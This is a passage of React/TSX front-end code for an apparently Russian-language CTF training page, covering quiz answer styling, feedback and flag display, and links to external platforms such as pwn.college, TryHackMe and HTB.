                              : "1px solid #f87171"
                            : "1px solid rgba(148, 163, 184, 0.28)",
                          background: isSelected
                            ? opt.isCorrect
                              ? "rgba(16, 185, 129, 0.16)"
                              : "rgba(239, 68, 68, 0.16)"
                            : "rgba(15, 23, 42, 0.65)",
                          color: "inherit",
                          cursor: "pointer",
                          textAlign: "left",
                          fontSize: "0.88rem",
                        }}
                      >
                        {opt.label}
                      </button>
                    );
                  })}
                </div>

                {chosenOpt && (
                  <div
                    style={{
                      padding: "0.65rem 0.8rem",
                      borderRadius: "0.45rem",
                      background: chosenOpt.isCorrect
                        ? "rgba(16, 185, 129, 0.12)"
                        : "rgba(239, 68, 68, 0.12)",
                      marginBottom: "0.5rem",
                      fontSize: "0.9rem",
                    }}
                  >
                    <p style={{ margin: 0 }}>
                      {chosenOpt.isCorrect && (
                        <CheckCircle2
                          size={16}
                          style={{ display: "inline", marginRight: "0.35rem" }}
                        />
                      )}
                      {chosenOpt.feedback}
                    </p>
                    {chosenOpt.isCorrect && (
                      <p
                        style={{
                          margin: "0.35rem 0 0 0",
                          fontFamily: "monospace",
                          fontWeight: 600,
                        }}
                      >
                        Получен флаг задачи: {challenge.flag}
                      </p>
                    )}
                  </div>
                )}

                <Link href={challenge.lessonHref} className="subtle-link">
                  Открыть полный практический урок с проверкой в lab.py →
                </Link>
              </article>
            );
          })}
        </div>
      </div>

      <div>
        <h3>3. Прямой переход к CTF-архивам pwn.college, TryHackMe, HTB и справочникам</h3>
        <div className="reference-source-grid" style={{ marginTop: "0.75rem" }}>
          {EXTERNAL_CTF_PLATFORMS.map((platform) => (
            <article key={platform.name}>
              <span className="muted-tag">{platform.tag}</span>
              <h4>{platform.name}</h4>
              <p>{platform.desc}</p>
              <div style={{ display: "grid", gap: "0.35rem" }}>
                <Link className="subtle-link" href={platform.kaironDayHref}>
                  {platform.kaironDayLabel}
                </Link>
                <a
                  className="subtle-link"
                  href={platform.url}
                  target="_blank"
                  rel="noreferrer"
                >
                  Открыть платформу / репозиторий <ArrowUpRight size={14} />
                </a>
                <a
                  className="subtle-link"
                  href={platform.repoUrl}
                  target="_blank"
                  rel="noreferrer"
                >
                  Дополнительный архив / исходники <ArrowUpRight size={14} />
                </a>
              </div>
            </article>
          ))}
        </div>
      </div>
    </section>
  );
}
